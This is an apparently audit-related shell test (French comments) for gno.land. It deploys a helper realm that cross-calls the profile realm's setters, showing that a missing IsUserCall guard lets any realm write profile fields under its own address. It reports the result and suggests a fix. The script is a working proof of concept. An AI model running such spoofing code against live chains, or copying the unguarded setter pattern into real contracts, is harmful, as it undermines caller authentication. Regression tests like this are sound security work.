#!/bin/sh
# H7 — Profile : manque de garde IsUserCall() → tout realm peut écrire un profil
# Fichier gno.land concerné : examples/gno.land/r/demo/profile/profile.gno:72-115
#
# Root cause : SetStringField/SetIntField/SetBoolField utilisent cur.Previous().Address()
# sans vérifier cur.Previous().IsUserCall(). Quand un realm intermédiaire appelle le
# setter, cur.Previous() est l'adresse du realm — pas l'EOA signataire.
# N'importe quel realm peut donc écrire un profil sous sa propre adresse realm.
#
# Ce test déploie un realm appelant (testprofilecaller) qui cross-call SetStringField.
# Le profil est alors stocké sous l'adresse du realm, pas sous celle du signataire EOA.
#
# Résultat attendu (bug présent)  : [KNOWN_VULNERABLE]
# Résultat attendu (bug corrigé)  : [PASS]

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=common.sh
. "$SCRIPT_DIR/common.sh"

SUFFIX=$(date +%s)
PKGPATH="gno.land/r/${KEY_ADDR}/audit/testprofilecaller${SUFFIX}"
TMPDIR=$(mktemp -d)
trap 'rm -rf "$TMPDIR"' EXIT

PROFILE_PKGPATH="gno.land/r/demo/profile"
TEST_FIELD="DisplayName"
TEST_VALUE="hacked_by_realm_${SUFFIX}"

echo "H7 — Profile realm spoof (missing IsUserCall guard)"
echo "   Caller realm: $PKGPATH"
echo "   Target realm: $PROFILE_PKGPATH"

# --- realm appelant qui cross-call profile.SetStringField ---
cat > "$TMPDIR/testprofilecaller.gno" << EOF
package testprofilecaller${SUFFIX}

import "gno.land/r/demo/profile"

// SpoofProfile appelle SetStringField cross-realm.
// Le profil sera stocké sous l'adresse de CE realm (pas l'EOA signataire).
func SpoofProfile(cur realm, field, value string) {
	profile.SetStringField(cross(cur), field, value)
}

// GetAddr retourne l'adresse de ce realm (pour la vérification).
func GetAddr(cur realm) string {
	return cur.Address().String()
}
EOF

cat > "$TMPDIR/gnomod.toml" << EOF
module = "${PKGPATH}"
gno = "0.9"
EOF

# --- déploiement ---
echo -n "   Deploying testprofilecaller realm... "
DEPLOY=$(echo "$PASSWORD" | gnokey maketx addpkg \
	-pkgpath "$PKGPATH" -pkgdir "$TMPDIR" \
	-gas-fee 1000000ugnot -gas-wanted 10000000 \
	-broadcast -chainid "$CHAINID" -remote "$RPC" \
	-insecure-password-stdin \
	-home "$GNOKEY_HOME" \
	"$KEY" 2>&1)
if echo "$DEPLOY" | grep -q "OK!"; then echo "OK"; else
	echo "FAILED"; echo "$DEPLOY"; exit 1
fi

# --- récupérer l'adresse du realm déployé ---
echo -n "   Getting realm address... "
REALM_ADDR_OUTPUT=$(gnokey query "vm/qeval" \
	-data "${PKGPATH}.GetAddr()" \
	-remote "$RPC" 2>&1)
REALM_ADDR=$(echo "$REALM_ADDR_OUTPUT" | grep -oE 'g1[a-z0-9]{38}' | head -1)
if [ -z "$REALM_ADDR" ]; then
	echo "FAILED — could not retrieve realm address"
	echo "$REALM_ADDR_OUTPUT"
	exit 1
fi
echo "$REALM_ADDR"

# --- step 1 : appel cross-realm sur profile.SetStringField ---
echo -n "   Step 1: SpoofProfile(\"$TEST_FIELD\", \"$TEST_VALUE\")... "
SPOOF=$(echo "$PASSWORD" | gnokey maketx call \
	-pkgpath "$PKGPATH" -func "SpoofProfile" \
	-args "$TEST_FIELD" -args "$TEST_VALUE" \
	-gas-fee 1000000ugnot -gas-wanted 10000000 \
	-broadcast -chainid "$CHAINID" -remote "$RPC" \
	-insecure-password-stdin \
	-home "$GNOKEY_HOME" \
	"$KEY" 2>&1)
if echo "$SPOOF" | grep -q "OK!"; then
	echo "OK (cross-realm call accepted)"
elif echo "$SPOOF" | grep -qi "only direct EOA\|IsUserCall\|panic"; then
	echo "rejected (fix active)"
	echo "   [PASS] — profile.SetStringField correctly rejects realm callers"
	exit 0
else
	echo "FAILED unexpectedly"; echo "$SPOOF"; exit 1
fi

# --- step 2 : vérifier que le profil est stocké sous l'adresse REALM ---
echo -n "   Step 2: Check profile stored under REALM address ($REALM_ADDR)... "
REALM_PROFILE=$(gnokey query "vm/qeval" \
	-data "${PROFILE_PKGPATH}.GetStringField(\"${REALM_ADDR}\", \"${TEST_FIELD}\", \"\")" \
	-remote "$RPC" 2>&1)

if echo "$REALM_PROFILE" | grep -q "$TEST_VALUE"; then
	echo "found \"$TEST_VALUE\""

	# --- step 3 : vérifier que le profil n'est PAS sous l'EOA ($KEY_ADDR) ---
	echo -n "   Step 3: Check profile NOT stored under EOA address ($KEY_ADDR)... "
	EOA_PROFILE=$(gnokey query "vm/qeval" \
		-data "${PROFILE_PKGPATH}.GetStringField(\"${KEY_ADDR}\", \"${TEST_FIELD}\", \"\")" \
		-remote "$RPC" 2>&1)

	if echo "$EOA_PROFILE" | grep -q "$TEST_VALUE"; then
		echo "FOUND under EOA too (unexpected)"
		echo "   [FAIL] — profile stored under both realm and EOA addresses"
		exit 1
	else
		echo "not found (correct)"
		echo "   [KNOWN_VULNERABLE] — profile written under realm address, not EOA"
		echo "   REALM_ADDR : $REALM_ADDR (has profile)"
		echo "   EOA_ADDR   : $KEY_ADDR (no profile)"
		echo "   Fix: add 'if !cur.Previous().IsUserCall() { panic(...) }' to each setter"
	fi
else
	echo "not found — unexpected"
	echo "$REALM_PROFILE"
	echo "   [FAIL] — cross-realm call returned OK! but profile not found under realm address"
	exit 1
fi
